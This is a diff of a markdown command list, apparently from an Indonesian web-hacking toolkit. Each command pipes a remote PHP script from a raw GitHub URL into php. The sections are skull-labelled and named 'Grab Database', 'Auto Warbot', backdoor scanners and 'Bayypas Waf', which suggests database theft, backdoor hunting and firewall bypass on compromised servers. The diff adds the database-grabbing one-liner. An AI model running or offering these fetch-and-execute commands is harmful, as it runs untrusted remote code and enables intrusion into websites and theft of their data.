@@ -18,9 +18,9 @@ curl -L https://raw.githubusercontent.com/mrwawanj/website/refs/heads/main/modro
 ```
 curl -sL https://raw.githubusercontent.com/mrwawanj/website/refs/heads/main/autobackup.php | php - backup y
 ```
-# Auto Warbot ☠️
+# Grab Database ☠️
 ```
-curl -sL https://raw.githubusercontent.com/mrwawanj/website/refs/heads/main/warbot.php | php
+curl -sL https://raw.githubusercontent.com/mrwawanj/website/refs/heads/main/grabdb.php | php
 ```
 # scanner backdoor high ☠️
 ```
@@ -29,6 +29,10 @@ curl -sL https://raw.githubusercontent.com/mrwawanj/website/refs/heads/main/outs
 # Scanner backdoor simple ☠️
 ```
 curl -sL https://raw.githubusercontent.com/mrwawanj/website/refs/heads/main/simple.php | php
+```
+# Auto Warbot ☠️
+```
+curl -sL https://raw.githubusercontent.com/mrwawanj/website/refs/heads/main/warbot.php | php
 ```
 # Bayypas Waf
 ```
